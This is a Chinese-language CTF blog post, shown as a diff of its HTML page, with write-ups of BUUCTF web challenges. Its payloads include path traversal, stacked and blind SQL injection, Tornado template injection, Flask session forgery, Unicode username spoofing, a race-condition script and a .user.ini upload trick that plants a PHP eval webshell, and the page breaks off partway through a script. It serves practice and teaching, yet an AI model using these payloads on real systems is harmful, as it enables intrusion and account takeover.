@@ -1,0 +1,1014 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>buuctf | ch3nl3</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="[HCTF 2018]WarmUp查看源码发现提示source.php访问出现题目源码分析源码发现需要让emmm::checkFile($_REQUEST[‘file’])返回true另外根据hint.php提示，需要访问ffffllllaaaaggggcheckFile有三种放回true的方法第一种不可能访问文件只可能利用后两种 $_page = mb_substr(     $page,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf">
+<meta property="og:url" content="http:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;index.html">
+<meta property="og:site_name" content="ch3nl3">
+<meta property="og:description" content="[HCTF 2018]WarmUp查看源码发现提示source.php访问出现题目源码分析源码发现需要让emmm::checkFile($_REQUEST[‘file’])返回true另外根据hint.php提示，需要访问ffffllllaaaaggggcheckFile有三种放回true的方法第一种不可能访问文件只可能利用后两种 $_page = mb_substr(     $page,">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;1.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;2.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;3.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;4.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;5.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;6.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;7.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;8.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;9.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;10.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;11.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;12.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;13.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;14.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;15.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;16.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;17.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;18.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;19.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;20.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;21.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;22.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;23.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;24.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;25.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;26.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;27.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;28.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;29.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;30.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;31.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;32.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;33.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;34.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;35.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;36.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;37.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;38.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;39.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;40.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;41.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;42.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;43.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;44.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;45.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;46.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;51.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;52.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;60.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;61.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;62.jpg">
+<meta property="og:updated_time" content="2019-12-03T01:26:20.963Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;ch3nl3.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;buuctf&#x2F;1.jpg">
+  
+    <link rel="alternative" href="/atom.xml" title="ch3nl3" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/http://oayoilchh.bkt.clouddn.com/2016/07/27/18:05:26%20">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="img/head.jpg" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">ch3nl3</a></h1>
+        </hgroup>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="https://ch3nl3.github.io/">博客首页</a></li>
+                        
+                            <li><a  href="/archives">文章归档</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="https://github.com/ch3nl3" title="github">github</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://ring3.xyz/">Yllen</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">信息安全小白</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">ch3nl3</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">ch3nl3</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="https://ch3nl3.github.io/">博客首页</a></li>
+                
+                    <li><a href="/archives">文章归档</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/ch3nl3" title="github">github</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-buuctf" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/11/18/buuctf/" class="article-date">
+      <time datetime="2019-11-18T09:06:49.000Z" itemprop="datePublished">2019-11-18</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      buuctf
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a><strong>[HCTF 2018]WarmUp</strong></h3><p>查看源码发现提示source.php<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/1.jpg" alt="1.jpg"><br>访问出现题目源码<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/2.jpg" alt="2.jpg"><br>分析源码发现需要让emmm::checkFile($_REQUEST[‘file’])返回true<br>另外根据hint.php提示，需要访问ffffllllaaaagggg<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/3.jpg" alt="3.jpg"><br>checkFile有三种放回true的方法第一种不可能访问文件只可能利用后两种</p>
+<pre><code>$_page = mb_substr(
+    $page,
+    0,
+    mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</code></pre><p>会截取第一个?前的字符串，于是构造：<br>?file=source.php%3F../../../../../ffffllllaaaagggg或<br>?file=source.php%253F../../../../../ffffllllaaaagggg<br>解除flag</p>
+<h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a><strong>[强网杯 2019]随便注</strong></h3><p>打开题目发现是一道注入题<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/4.jpg" alt="4.jpg"><br>测试发现1’报错1’ –+返回正常确认注入<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/5.jpg" alt="5.jpg"><br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/6.jpg" alt="6.jpg"><br>1’ order by 2 –+返回正常<br>1’ union select 1,2 –+发现select|update|delete|drop|insert|where被过滤<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/7.jpg" alt="7.jpg"><br>考虑堆叠注入，本地测试堆叠注入语句<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/8.jpg" alt="8.jpg"><br>注库<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/9.jpg" alt="9.jpg"><br>注表<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/10.jpg" alt="10.jpg"><br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/11.jpg" alt="11.jpg"><br>注字段<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/12.jpg" alt="12.jpg"><br>这里有个问题两个表只有words有回显，查了半天发现对待有数字的表时需要加上反引号``<br>加上后发现会先中有flag字段，接下来只需要构造返回flag<br>有两个思路<br>1.给表和列改名利用原来的查询语句查询，不过我没有成功（还是太菜）参考：<a href="https://blog.csdn.net/qq_26406447/article/details/90643951" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/90643951</a><br>2.利用sql预处理<br>参考：<a href="https://www.cnblogs.com/geaozhang/p/9891338.html" target="_blank" rel="noopener">https://www.cnblogs.com/geaozhang/p/9891338.html</a><br>mysql的sql预处理<br>SET @tn = ‘hahaha’;                        //存储表名<br>SET @sql = concat(‘select * from ‘, @tn);  //存储SQL语句<br>PREPARE sqla from @sql;                    //预定义SQL语句<br>EXECUTE sqla;                              //执行预定义SQL语句<br>(DEALLOCATE || DROP) PREPARE sqla;         //删除预定义SQL语句<br>本题构造：1’;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#<br>解码之后语句1’;SeT@a=select * from <code>1919810931114514</code>;prepare execsql from @a;execute execsql;#<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/13.jpg" alt="13.jpg"></p>
+<h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a><strong>easy_tornado</strong></h3><p>打开flag.txt发现flag in /fllllllllllllag<br>再看一下网址/file?filename=/flag.txt&amp;filehash=0cc0e224cc89c6bb88f7c969e07dab03<br>考虑/file?filename=/fllllllllllllag&amp;filehash=0cc0e224cc89c6bb88f7c969e07dab03<br>发现报错<img src="https://ch3nl3.github.io/2019/11/18/buuctf/14.jpg" alt="14.jpg"><br>考虑模板注入<img src="https://ch3nl3.github.io/2019/11/18/buuctf/15.jpg" alt="15.jpg">测试返回正常确定注入<br>继续看下面两个文件，在hints.txt里发现md5(cookie_secret+md5(filename))<br>tornado框架存在附属文件handler.settings,于是尝试输入/error?msg=出现cookie_secret<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/16.jpg" alt="16.jpg"><br>按照hints加密访问得到flag<br>    import hashlib</p>
+<pre><code>def md5(s):
+    md5 = hashlib.md5(s.encode(encoding=&apos;UTF-8&apos;)).hexdigest()
+    return md5
+
+def filehash():
+    filename = &apos;/fllllllllllllag&apos;
+    cookie_secret = &apos;944749ff-d848-4f90-92e7-62c5f17322e6&apos;
+    print(md5(cookie_secret+md5(filename)))
+
+if __name__ == &apos;__main__&apos;:
+    filehash()</code></pre><p><img src="https://ch3nl3.github.io/2019/11/18/buuctf/17.jpg" alt="17.jpg"></p>
+<h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a><strong>[SUCTF 2019]EasySQL</strong></h3><p>堆叠注入<br>1;show database;<br>1;show tables;<br>发现只有一个flag表<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/18.jpg" alt="18.jpg"><br>wp说通过回显判断查询语句为select $post[‘query’]||flag from Flag没懂怎么看出来的先写一下后面吧<br>思路就是让||为连接操作而非或，利用set sql_mode=PIPES_AS_CONCAT;<br>参考：<a href="https://www.cnblogs.com/piperck/p/9835695.html" target="_blank" rel="noopener">https://www.cnblogs.com/piperck/p/9835695.html</a><br>本地测试<img src="https://ch3nl3.github.io/2019/11/18/buuctf/19.jpg" alt="19.jpg"><br>结合堆叠注入构造1;set sql_mode=PIPES_AS_CONCAT;select 1<br>根据查询语句最后查询的应该是select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/20.jpg" alt="20.jpg"><br>还有一个非预期解*,1<br>拼接select *,1||flag from Flag</p>
+<h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a><strong>[强网杯 2019]高明的黑客</strong></h3><p>根据提示下载源码打开发现有好多php文件<br>随便打开一个发现里面有get system eval<br>猜测存在命令执行，但是不知道哪个文件，写python爆破</p>
+<pre><code>import os
+import re
+import requests
+
+s = os.listdir(&apos;E:/phpStudy/WWW/src/&apos;)
+r1 = r&apos;\$_GET\[\&apos;(.*)\&apos;\]&apos;
+url = &apos;http://ed58af7e-3015-439b-a995-9850c555c983.node3.buuoj.cn/&apos;
+for i in s:
+    f = open(&apos;E:/phpStudy/WWW/src/&apos;+i)
+    n = f.read()
+    f.close()
+    print(i)
+    s = re.findall(r1,n)
+    for j in s:
+        u = url+i+&apos;?&apos;+j+&apos;=cat /flag;&apos;
+        z = requests.get(u).text
+        if &apos;flag&apos; in z:
+            print(u)
+            print(z)
+            exit()</code></pre><p>结果如下<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/21.jpg" alt="21.jpg"><br>跑的挺慢的可以同时跑多个</p>
+<h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a><strong>[HCTF 2018]admin</strong></h3><p>打开题目先注册一波，尝试注册admin，发现用户名已被注册<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/22.jpg" alt="22.jpg"><br>随便注册一个号进去，查看源码发现提示 you are not admin<br>应该是登陆admin就可以获得flag<br>在change页面查看源码发现网址源码<a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a><br>下载审计，接下来有三种方法<br>第一种：flask session伪造<br>注册登录后在cookie里有session复制下来解密，解密脚本：</p>
+<pre><code>#!/usr/bin/env python3
+import sys
+import zlib
+from base64 import b64decode
+from flask.sessions import session_json_serializer
+from itsdangerous import base64_decode
+
+def decryption(payload):
+    payload, sig = payload.rsplit(b&apos;.&apos;, 1)
+    payload, timestamp = payload.rsplit(b&apos;.&apos;, 1)
+
+    decompress = False
+    if payload.startswith(b&apos;.&apos;):
+        payload = payload[1:]
+        decompress = True
+
+    try:
+        payload = base64_decode(payload)
+    except Exception as e:
+        raise Exception(&apos;Could not base64 decode the payload because of &apos;
+                         &apos;an exception&apos;)
+
+    if decompress:
+        try:
+            payload = zlib.decompress(payload)
+        except Exception as e:
+            raise Exception(&apos;Could not zlib decompress the payload before &apos;
+                             &apos;decoding the payload&apos;)
+
+    return session_json_serializer.loads(payload)
+
+if __name__ == &apos;__main__&apos;:
+    print(decryption(sys.argv[1].encode()))</code></pre><p><img src="https://ch3nl3.github.io/2019/11/18/buuctf/23.jpg" alt="23.jpg"><br>在源码index.html里可以看到验证admin的方法仅仅是session的名字，我们只需要改名字加密即可<br>加密需要SECRET_KEY，在config.py下可以找到SECRET_KEY=ckj123<br>在github上有个加密脚本<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a><br>这个脚本也有解密功能但奇奇怪怪的不如上面的好用<br>用脚本加密<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/24.jpg" alt="24.jpg"><br>改cookie发现显示admin出现flag<br>第二种unicode欺骗<br>在源码中有一个转小写的函数<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/25.jpg" alt="25.jpg"><br>nodeprep.prepare函数从from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep调用<br>而Twisted官网已经更新到19.10.0但是此源码仅仅是Twisted==10.2.0，猜测可能存在漏洞<br>最后在<a href="https://labs.spotify.com/2013/06/18/creative-usernames/证实了在11.0.0之前存在漏洞" target="_blank" rel="noopener">https://labs.spotify.com/2013/06/18/creative-usernames/证实了在11.0.0之前存在漏洞</a><br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/26.jpg" alt="26.jpg"><br>具体利用参考<a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/" target="_blank" rel="noopener">https://panda1g1.github.io/2018/11/15/HCTF%20admin/</a><br>本地测试<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/27.jpg" alt="27.jpg"><br>源码中在注册，登陆，改密码三处均调用了strlower函数<br>我们可以用ᴬᴰᴹᴵᴺ注册并登陆，这样登陆之后username就会变成ADMIN，然后更改ADMIN的密码就会把admin改掉<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/28.jpg" alt="28.jpg"><br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/29.jpg" alt="29.jpg"><br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/30.jpg" alt="30.jpg"><br>第三种条件竞争<br>因为没有验证是否admin就赋值给session导致条件竞争修改admin密码<br>我们可以这样设想，一个进程以正常账号一直依次进行登录、改密码操作，另一个进程同时一直依次进行注销、以admin用户名加进程1更改的新密码进行登录。就有可能出现当进程1进行到改密码函数时，进程2进行到登录操作，这个时候进程1需要从session中取出name，而进程2此时把session[‘name’]改成了admin。<br>脚本如下，但是没有成功，但应该是可行的</p>
+<pre><code>import requests 
+import threading
+def login(s, username, password): 
+    data = {&apos;username&apos;: username, &apos;password&apos;:password, &apos;submit&apos;: &apos;&apos;}
+    return s.post(&quot;http://302567ce-11a2-41a2-884d-bd0a9d85b7c1.node3.buuoj.cn//login&quot;, data=data)
+def logout(s):
+    return s.get(&quot;http://302567ce-11a2-41a2-884d-bd0a9d85b7c1.node3.buuoj.cn//logout&quot;)
+def change(s, newpassword): 
+    data = {&apos;newpassword&apos;:newpassword }
+    return s.post(&quot;http://302567ce-11a2-41a2-884d-bd0a9d85b7c1.node3.buuoj.cn//change&quot;, data=data)
+def func1(s):
+    login(s, &apos;ddd&apos;, &apos;ddd&apos;) 
+    change(s, &apos;qweqweabcabc&apos;)
+def func2(s): 
+    logout(s)
+    res = login(s, &apos;admin&apos;, &apos;qweqweabcabc&apos;)
+    if &apos;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&apos; in res.text:
+        print(&apos;finish&apos;)
+def main():
+    for i in range(1000):
+        #print(i)
+        s = requests.Session()
+        t1 = threading.Thread(target=func1, args=(s,)) 
+        t2 = threading.Thread(target=func2, args=(s,)) 
+        t1.start()
+        t2.start()
+if __name__ == &quot;__main__&quot;: 
+    main()</code></pre><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a><strong>[SUCTF 2019]CheckIn</strong></h3><p>这是一道文件上传题，但是只能上传图片，所以想到利用图片马，但是图片马需要解析。<br>后来看了wp才知道在php中有一个.user.ini,PHP会在每个目录下扫描INI文件<br>其中有一个配置项auto_prepend_file可以在访问php文件之前先访问指定文件<br>先写一个.user.ini写入<br>GIF89<br>auto_prepend_file=1.jpg<br>文件1.jpg<br>GIF89</p>
+<script language='php'>
+
+@eval($_POST['pass']);
+</script>
+<p>依次上传，访问上传的文件，用蚁剑连接<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/31.jpg" alt="31.jpg"></p>
+<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a><strong>[CISCN2019 华北赛区 Day2 Web1]Hack World</strong></h3><p>注入题<br>输入1回显Hello, glzjin wants a girlfriend.<br>输入2回显Do you want to be my girlfriend?<br>输入字母回显bool(false)<br>判断为数字型报错注入<br>payload：if(ascii(substr((select flag from flag),1,1))&gt;1,1,2)<br>但是空格被过滤了，可以用tab或者()绕过<br>写脚本进行盲注</p>
+<pre><code>import requests
+
+url = &apos;http://c1c6c683-b611-4be0-8eb2-c77be1d05a35.node3.buuoj.cn/index.php&apos;
+result = &apos;&apos;
+
+for x in range(1, 100):
+    high = 127
+    low = 32
+    mid = (low + high) // 2
+    while high &gt; low:
